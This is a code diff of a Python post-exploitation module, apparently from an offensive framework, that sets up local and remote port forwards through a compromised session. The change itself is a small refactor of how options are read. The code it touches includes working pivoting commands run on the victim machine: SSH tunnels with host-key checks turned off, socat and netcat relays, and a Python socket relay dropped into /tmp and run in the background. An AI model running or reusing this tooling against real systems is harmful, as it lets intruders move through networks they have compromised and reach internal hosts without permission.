@@ -26,16 +26,16 @@ class Module(Post, System):
         """Create port forward through the session"""
         
         print_status("Setting up port forwarding...")
-        print_info(f"Type: {self.forward_type.value}")
-        print_info(f"Local port: {self.local_port.value}")
-        print_info(f"Remote target: {self.remote_host.value}:{self.remote_port.value}")
+        print_info(f"Type: {self.forward_type}")
+        print_info(f"Local port: {self.local_port}")
+        print_info(f"Remote target: {self.remote_host}:{self.remote_port}")
         
-        if self.forward_type.value == "local":
+        if self.forward_type == "local":
             return self._create_local_forward()
-        elif self.forward_type.value == "remote":
+        elif self.forward_type == "remote":
             return self._create_remote_forward()
         else:
-            print_error(f"Invalid forward type: {self.forward_type.value}")
+            print_error(f"Invalid forward type: {self.forward_type}")
             print_info("Valid types: local, remote")
             return False
     
@@ -43,7 +43,7 @@ class Module(Post, System):
         """Create local port forward (localhost:local_port -> remote_host:remote_port via session)"""
         try:
             print_status("Creating LOCAL port forward...")
-            print_info(f"Connections to localhost:{self.local_port.value} will be forwarded to {self.remote_host.value}:{self.remote_port.value}")
+            print_info(f"Connections to localhost:{self.local_port} will be forwarded to {self.remote_host}:{self.remote_port}")
             print_info("Forwarding through compromised session...")
             
             # Check if we can use SSH port forwarding
@@ -72,7 +72,7 @@ class Module(Post, System):
         """Create remote port forward (expose local port on compromised machine)"""
         try:
             print_status("Creating REMOTE port forward...")
-            print_info(f"Port {self.remote_port.value} on compromised machine will forward to {self.remote_host.value}:{self.local_port.value}")
+            print_info(f"Port {self.remote_port} on compromised machine will forward to {self.remote_host}:{self.local_port}")
             print_warning("Note: This exposes a port on the compromised machine!")
             
             # Check if we can use SSH port forwarding
@@ -115,14 +115,14 @@ class Module(Post, System):
             # to forward to another host on the internal network
             
             # Create SSH tunnel command
-            tunnel_cmd = f"ssh -f -N -L {self.local_port.value}:{self.remote_host.value}:{self.remote_port.value} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null localhost 2>&1"
+            tunnel_cmd = f"ssh -f -N -L {self.local_port}:{self.remote_host}:{self.remote_port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null localhost 2>&1"
             
             print_info(f"Executing: {tunnel_cmd}")
             result = self.cmd_exec(tunnel_cmd)
             
             if result and "error" not in result.lower() and "permission denied" not in result.lower():
                 print_success(f"SSH local forward created successfully!")
-                print_info(f"Connect to localhost:{self.local_port.value} to access {self.remote_host.value}:{self.remote_port.value}")
+                print_info(f"Connect to localhost:{self.local_port} to access {self.remote_host}:{self.remote_port}")
                 return True
             else:
                 print_warning("SSH forward may have failed, trying alternative method...")
@@ -153,18 +153,18 @@ class Module(Post, System):
             # Socat command: socat TCP-LISTEN:local_port,fork,reuseaddr TCP:remote_host:remote_port
             # We need to run this on the compromised machine
             
-            socat_cmd = f"socat TCP-LISTEN:{self.local_port.value},fork,reuseaddr TCP:{self.remote_host.value}:{self.remote_port.value} &"
+            socat_cmd = f"socat TCP-LISTEN:{self.local_port},fork,reuseaddr TCP:{self.remote_host}:{self.remote_port} &"
             
-            if self.background.value:
+            if self.background:
                 print_info("Starting socat in background...")
                 result = self.cmd_exec(socat_cmd)
                 time.sleep(1)  # Give it time to start
                 
                 # Check if it's running
-                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.local_port.value}'")
+                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.local_port}'")
                 if check and check.strip():
                     print_success(f"Socat port forward started in background!")
-                    print_info(f"Port {self.local_port.value} is forwarding to {self.remote_host.value}:{self.remote_port.value}")
+                    print_info(f"Port {self.local_port} is forwarding to {self.remote_host}:{self.remote_port}")
                     print_info(f"Process: {check.strip().split()[0] if check.strip() else 'unknown'}")
                     return True
                 else:
@@ -173,7 +173,7 @@ class Module(Post, System):
             else:
                 print_info("Starting socat (foreground mode)...")
                 print_warning("This will block until you stop it (Ctrl+C)")
-                result = self.cmd_exec(f"socat TCP-LISTEN:{self.local_port.value},fork,reuseaddr TCP:{self.remote_host.value}:{self.remote_port.value}")
+                result = self.cmd_exec(f"socat TCP-LISTEN:{self.local_port},fork,reuseaddr TCP:{self.remote_host}:{self.remote_port}")
                 return True
                 
         except Exception as e:
@@ -188,27 +188,27 @@ class Module(Post, System):
             
             print_info("Setting up reverse port forward with socat...")
             print_warning("This requires setting up a listener on your machine first!")
-            print_info(f"On YOUR machine, run: socat TCP-LISTEN:{self.local_port.value},fork,reuseaddr TCP:{self.remote_host.value}:{self.remote_port.value}")
-            print_info(f"Then on compromised machine, run: socat TCP:{self.remote_host.value}:{self.local_port.value} TCP-LISTEN:{self.remote_port.value},fork,reuseaddr")
+            print_info(f"On YOUR machine, run: socat TCP-LISTEN:{self.local_port},fork,reuseaddr TCP:{self.remote_host}:{self.remote_port}")
+            print_info(f"Then on compromised machine, run: socat TCP:{self.remote_host}:{self.local_port} TCP-LISTEN:{self.remote_port},fork,reuseaddr")
             
             # Try to create the forward
-            socat_cmd = f"socat TCP:{self.remote_host.value}:{self.local_port.value} TCP-LISTEN:{self.remote_port.value},fork,reuseaddr &"
+            socat_cmd = f"socat TCP:{self.remote_host}:{self.local_port} TCP-LISTEN:{self.remote_port},fork,reuseaddr &"
             
-            if self.background.value:
+            if self.background:
                 result = self.cmd_exec(socat_cmd)
                 time.sleep(1)
                 
-                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.remote_port.value}'")
+                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.remote_port}'")
                 if check and check.strip():
                     print_success(f"Reverse socat port forward started!")
-                    print_info(f"Port {self.remote_port.value} on compromised machine forwards to {self.remote_host.value}:{self.local_port.value}")
+                    print_info(f"Port {self.remote_port} on compromised machine forwards to {self.remote_host}:{self.local_port}")
                     return True
                 else:
                     print_error("Failed to start reverse socat forward")
                     return False
             else:
                 print_warning("Running in foreground (will block)...")
-                result = self.cmd_exec(f"socat TCP:{self.remote_host.value}:{self.local_port.value} TCP-LISTEN:{self.remote_port.value},fork,reuseaddr")
+                result = self.cmd_exec(f"socat TCP:{self.remote_host}:{self.local_port} TCP-LISTEN:{self.remote_port},fork,reuseaddr")
                 return True
                 
         except Exception as e:
@@ -222,12 +222,12 @@ class Module(Post, System):
             print_info("Using netcat with named pipe...")
             
             # Netcat approach: mkfifo pipe && nc -l -p local_port < pipe | nc remote_host remote_port > pipe
-            setup_cmd = f"mkfifo /tmp/nc_pipe_{self.local_port.value} 2>/dev/null; nc -l -p {self.local_port.value} < /tmp/nc_pipe_{self.local_port.value} | nc {self.remote_host.value} {self.remote_port.value} > /tmp/nc_pipe_{self.local_port.value} &"
+            setup_cmd = f"mkfifo /tmp/nc_pipe_{self.local_port} 2>/dev/null; nc -l -p {self.local_port} < /tmp/nc_pipe_{self.local_port} | nc {self.remote_host} {self.remote_port} > /tmp/nc_pipe_{self.local_port} &"
             
             result = self.cmd_exec(setup_cmd)
             time.sleep(1)
             
-            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'nc.*{self.local_port.value}'")
+            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'nc.*{self.local_port}'")
             if check and check.strip():
                 print_success("Netcat port forward started (may be unreliable)")
                 return True
@@ -272,7 +272,7 @@ def forward(source, dest):
 def handle_client(client_sock):
     try:
         remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        remote_sock.connect(('{self.remote_host.value}', {self.remote_port.value}))
+        remote_sock.connect(('{self.remote_host}', {self.remote_port}))
         
         t1 = threading.Thread(target=forward, args=(client_sock, remote_sock))
         t2 = threading.Thread(target=forward, args=(remote_sock, client_sock))
@@ -289,7 +289,7 @@ def handle_client(client_sock):
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-server.bind(('0.0.0.0', {self.local_port.value}))
+server.bind(('0.0.0.0', {self.local_port}))
 server.listen(5)
 
 while True:
@@ -298,12 +298,12 @@ while True:
 """
             
             # Write script to temp file and execute
-            script_path = f"/tmp/pf_{self.local_port.value}.py"
+            script_path = f"/tmp/pf_{self.local_port}.py"
             write_cmd = f"cat > {script_path} << 'EOFPYTHON'\n{python_script}\nEOFPYTHON"
             self.cmd_exec(write_cmd)
             
             # Make executable and run
-            if self.background.value:
+            if self.background:
                 run_cmd = f"python3 {script_path} &"
             else:
                 run_cmd = f"python3 {script_path}"
